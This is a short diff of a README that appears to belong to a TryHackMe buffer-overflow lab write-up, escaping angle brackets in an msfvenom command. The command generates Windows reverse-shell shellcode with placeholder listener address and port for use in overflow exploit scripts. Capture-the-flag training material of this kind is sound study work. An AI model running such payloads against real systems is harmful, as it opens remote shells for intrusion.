@@ -6,7 +6,7 @@ Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverfl
 
 **command used for shellcode generation to Fit with scripts**
 
-msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "<badChars-specific-to-overflow>" EXITFUNC=thread -v shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "\<badChars-specific-to-overflow\>" EXITFUNC=thread -v shellcode
 
 # OVERFLOW 1
 
